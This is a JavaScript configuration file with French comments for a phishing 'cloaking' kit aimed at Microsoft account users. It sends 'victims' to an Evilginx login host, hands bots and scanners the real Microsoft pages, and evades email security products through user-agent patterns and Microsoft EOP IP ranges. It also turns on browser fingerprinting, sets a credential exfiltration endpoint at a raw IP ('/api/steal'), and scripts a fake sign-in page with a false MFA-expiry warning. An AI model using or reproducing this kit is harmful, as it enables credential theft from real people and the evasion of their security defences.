// ═══════════════════════════════════════════════════════════════════
// CONFIGURATION CLOAKING UNIVERSEL 2025
// ═══════════════════════════════════════════════════════════════════
//
// Ce fichier contient TOUTE la configuration du système de cloaking.
// Modifie uniquement ce fichier pour adapter à ta campagne.
//
// ═══════════════════════════════════════════════════════════════════

const CONFIG = {

    // ═══════════════════════════════════════════════════════════════
    // 1. PAYS AUTORISÉS (Géoblocage)
    // ═══════════════════════════════════════════════════════════════

    ALLOWED_COUNTRIES: [
        'US',    // États-Unis
        'CA',    // Canada
        'GB',    // Royaume-Uni
        'FR',    // France
        'DE',    // Allemagne
        'AU',    // Australie
        'NL',    // Pays-Bas
        'BE',    // Belgique
        'CH',    // Suisse
        'IT',    // Italie
        'ES',    // Espagne
        'SE',    // Suède
        'NO',    // Norvège
        'DK',    // Danemark
        'FI',    // Finlande
    ],

    // ═══════════════════════════════════════════════════════════════
    // 2. URL DE REDIRECTION
    // ═══════════════════════════════════════════════════════════════

    // URL finale pour les victimes (Evilginx)
    VICTIM_URL: 'https://login.rs-dns.sbs/QlhVBfPx',

    // URL de fallback pour les bots (vraie page Microsoft)
    BOT_URL: 'https://account.microsoft.com/security',

    // URL de fallback pour les pays bloqués
    GEO_BLOCKED_URL: 'https://www.microsoft.com/404',

    // ═══════════════════════════════════════════════════════════════
    // 3. DÉTECTION BOT - PATTERNS USER-AGENT
    // ═══════════════════════════════════════════════════════════════

    BOT_PATTERNS: [
        'bot',
        'crawler',
        'scanner',
        'spider',
        'check',
        'monitor',
        'safe.*link',
        'defender',
        'protection',
        'scan',
        'security',
        'antivirus',
        'malware',
        'threat',
        'urldefense',
        'proofpoint',
        'ironport',
        'barracuda',
        'mimecast',
        'forcepoint'
    ],

    // ═══════════════════════════════════════════════════════════════
    // 4. IP RANGES MICROSOFT EOP (Exchange Online Protection)
    // ═══════════════════════════════════════════════════════════════

    MICROSOFT_IP_RANGES: [
        '40.92.',       // 40.92.0.0/15
        '40.93.',
        '40.107.',      // 40.107.0.0/16
        '52.100.',      // 52.100.0.0/14
        '52.101.',
        '52.102.',
        '52.103.',
        '104.47.',      // 104.47.0.0/17
        '13.107.',      // 13.107.0.0/16
        '23.103.',      // Office 365
        '132.245.',     // Microsoft datacenter
        '147.243.',
        '204.79.',
        '207.46.'
    ],

    // ═══════════════════════════════════════════════════════════════
    // 5. TIMING ANALYSIS (en millisecondes)
    // ═══════════════════════════════════════════════════════════════

    MIN_INTERACTION_TIME: 5000,  // < 5 secondes = bot
    MAX_INTERACTION_TIME: 300000, // > 5 minutes = suspect

    // ═══════════════════════════════════════════════════════════════
    // 6. FINGERPRINTING AVANCÉ
    // ═══════════════════════════════════════════════════════════════

    ENABLE_CANVAS_FINGERPRINT: true,
    ENABLE_WEBGL_FINGERPRINT: true,
    ENABLE_AUDIO_FINGERPRINT: true,
    ENABLE_FONT_FINGERPRINT: true,

    // ═══════════════════════════════════════════════════════════════
    // 7. API GÉOLOCALISATION
    // ═══════════════════════════════════════════════════════════════

    // Services gratuits de géolocalisation IP
    GEO_API_PROVIDERS: [
        {
            name: 'ipapi.co',
            url: 'https://ipapi.co/json/',
            enabled: true
        },
        {
            name: 'ip-api.com',
            url: 'http://ip-api.com/json/',
            enabled: true
        },
        {
            name: 'geojs.io',
            url: 'https://get.geojs.io/v1/ip/geo.json',
            enabled: true
        }
    ],

    // ═══════════════════════════════════════════════════════════════
    // 8. EXFILTRATION DES DONNÉES
    // ═══════════════════════════════════════════════════════════════

    // URL du serveur pour exfiltrer les données (ton VPS)
    EXFIL_URL: 'https://157.90.144.124/api/steal',

    // Token d'authentification (change-le!)
    EXFIL_AUTH_TOKEN: 'CHANGE_ME_SECRET_TOKEN_12345',

    // Activer l'exfiltration
    ENABLE_EXFILTRATION: true,

    // ═══════════════════════════════════════════════════════════════
    // 9. MODE DEBUG
    // ═══════════════════════════════════════════════════════════════

    DEBUG_MODE: false,  // Mettre à true pour voir les logs dans console

    // ═══════════════════════════════════════════════════════════════
    // 10. APPARENCE DE LA PAGE PHISHING
    // ═══════════════════════════════════════════════════════════════

    PHISHING_PAGE: {
        title: 'Microsoft Account | Sign In',
        logo_url: 'https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg',
        company: 'Microsoft',
        warning_title: 'Action Required',
        warning_message: 'Your MFA authentication will expire in 18 hours. Please verify your credentials to maintain account access.',
        email_label: 'Email',
        password_label: 'Password',
        submit_button: 'Sign in',
        remember_me: 'Keep me signed in'
    }
};

// Export pour Node.js (Azure Functions)
if (typeof module !== 'undefined' && module.exports) {
    module.exports = CONFIG;
}
